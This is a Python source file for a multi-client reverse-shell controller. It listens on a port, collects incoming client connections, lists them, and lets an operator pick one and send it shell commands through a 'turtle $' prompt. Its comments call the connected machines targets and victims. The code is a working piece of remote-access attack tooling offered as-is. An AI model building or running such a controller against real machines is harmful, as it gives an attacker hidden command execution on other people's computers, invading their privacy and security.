import socket 
import sys 
import threading
import time 
from queue import Queue

host = "127.0.0.1"
port = 9000

NUMBER_OF_THREADS = 2   # for Two treads only
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []


# create a Socket to connnect two computers
def create_socket():
    try:
        global s
        s = socket.socket()
    
    except Exception as msg:
        print("Socket creation Error : " + str(msg))
        s.close()

        
# Binding the socket and Listening for connections
def bind_socket():
    try:
        print(f"Binding the Port : {port}")
        
        s.bind((host,port))
        s.listen(5)
    
    except socket.error as msg:
        print("Socket Binding Error : " + str(msg) + "\n" + "Retrying......")
        bind_socket()
    
        
# Handling connections from multiple clients and closing previous connections

def accepting_connections():
    
    for c in all_connections:
        c.close()
        
    del all_connections[:]
    del all_address[:]
    
    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)    # prevenmts timeout 
            
            all_connections.append(conn)
            all_address.append(address)
            
            print(f"Connection has been established ! {address[0]}")
            
        except:
            print("Error accepting connections")
        
        
# interactive prompts for sending commands 
"""
turtle $ list
  0 Client-A Port
  1 Client-B Port
  2 Client-C Port

turtle $ select 1
192.168.0.222> ls 

""" 

def start_turtle():

    while True:
        cmd = input("turtle $ ")
        if cmd == "list":
            list_connections()
        
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
         
    
# Display all current active connections with client   
def list_connections():
    results = ""   
    
    for i, conn in enumerate(all_connections):
        try: 
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        
        results = str(i)+ " " + str(all_address[i][0])+ " " + str(all_address[i][1]) + "\n"
        #eg. 0 192.168.0.12 8989 
        
    print("----Clients----" + "\n" + results)
        

      

# selecting the Target   
def get_target(cmd):
    try:
        target = cmd.replace('select ','') # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are Now connected to  : "+str(all_address[target][0]))
        print(str(all_address[target][0]) + "$", end="")
        return conn 
    
    except:
        print("Selection not valid")
        return None
    

# Send commands to client/victim or a friend
def send_target_commands(conn):
    
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),'utf-8')
                print(client_response, end="")

        except:
            print("Error sending commands")
            break

# Create worker Threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# do next job that is in queue (handel connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()

        if x == 2:
            start_turtle()
        
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()   
    
    
    
    
    
    
    
    
    